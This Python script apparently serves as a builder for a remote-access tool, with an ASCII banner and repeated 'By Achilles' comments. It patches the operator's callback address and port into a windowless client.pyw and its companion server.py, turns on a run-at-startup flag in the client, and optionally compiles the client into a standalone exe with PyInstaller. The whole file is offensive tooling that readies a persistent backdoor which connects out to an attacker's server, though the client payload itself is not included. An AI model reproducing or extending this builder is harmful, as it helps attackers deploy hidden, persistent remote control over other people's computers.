import os
import sys
import platform
import winreg
import subprocess
import fade
def replace_server_details(file_path, server_address, server_port):
    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()
#By Achilles
    for i in range(len(lines)):
        if 'server_address = (' in lines[i]:
            lines[i] = f'server_address = (\'{server_address}\', {server_port})\n'
#By Achilles
    with open(file_path, 'w') as file:
        file.writelines(lines)
#By Achilles
def set_startup_option(script_path, enable_startup):
    if os.path.exists(script_path):
        with open(script_path, 'r') as file:
            lines = file.readlines()
#By Achilles
        for i, line in enumerate(lines):
            if "set_startup_option(True)" in line:
                if enable_startup:
                    print("\033[38;5;208mThe script is already set to run on startup.\033[0m")
                else:
                    lines[i] = line.replace("True", "False")
                    with open(script_path, 'w') as file:
                        file.writelines(lines)
                    print("\033[38;5;208mThe script will no longer run on startup.\033[0m")
                    return
            elif "set_startup_option(False)" in line:
                if not enable_startup:
                    print("\033[38;5;208mThe script is already set not to run on startup.\033[0m")
                else:
                    lines[i] = line.replace("False", "True")
                    with open(script_path, 'w') as file:
                        file.writelines(lines)
                    print("\033[38;5;208mThe script will now run on startup.\033[0m")
                    return
        else:
            print("\033[38;5;208mInvalid input. The script will not be modified.\033[0m")
    else:
        print("\033[38;5;208mScript not found at the specified path.\033[0m")
#By Achilles
def compile_to_exe(script_path):
    try:
        subprocess.run(["pyinstaller", script_path, "--onefile"])
        print("\033[38;5;208mScript successfully compiled to an exe.\033[0m")
    except Exception as e:
        print(f"\033[38;5;208mError compiling script: {e}\033[0m")
print(fade.fire("""
,------.                              ,--.         
|  .---',---. ,--.--. ,---. ,--,--,   `--' ,--,--. 
|  `--,| .-. :|  .--'| .-. ||      \  ,--.' ,-.  | 
|  |`  \   --.|  |   ' '-' '|  ||  |  |  |\ '-'  | 
`--'    `----'`--'    `---' `--''--'.-'  / `--`--' ╔╗ ┬ ┬  ╔═╗┌─┐┬ ┬┬┬  ┬  ┌─┐┌─┐
                                    '---'          ╠╩╗└┬┘  ╠═╣│  ├─┤││  │  ├┤ └─┐
                                                   ╚═╝ ┴   ╩ ╩└─┘┴ ┴┴┴─┘┴─┘└─┘└─┘"""))
client_server_address = input("\033[38;5;208mEnter the client server address: \033[0m")
client_server_port = input("\033[38;5;208mEnter the client server port: \033[0m")
#By Achilles
server_port = input("\033[38;5;208mEnter the server port for server.py: \033[0m")
#By Achilles
run_on_startup = input("\033[38;5;208mDo you want to run this script on startup? (y/n): \033[0m").strip().lower()
#By Achilles
compile_script = input("\033[38;5;208mDo you want to compile the script into an exe? (y/n): \033[0m").strip().lower()
#By Achilles
replace_server_details('client.pyw', client_server_address, client_server_port)
replace_server_details('server.py', '0.0.0.0', server_port)
#By Achilles
print("\033[38;5;208mServer details updated successfully.\033[0m")
#By Achilles
if run_on_startup == 'y':
    set_startup_option('client.pyw', True)
elif run_on_startup == 'n':
    set_startup_option('client.pyw', False)
else:
    print("\033[38;5;208mInvalid input. The script will not be modified.\033[0m")
#By Achilles
if compile_script == 'y':
    compile_to_exe('client.pyw')
elif compile_script == 'n':
    print("\033[38;5;208mThe script will remain a .py file.\033[0m")
else:
    print("\033[38;5;208mInvalid input for compilation option.\033[0m")
#By Achilles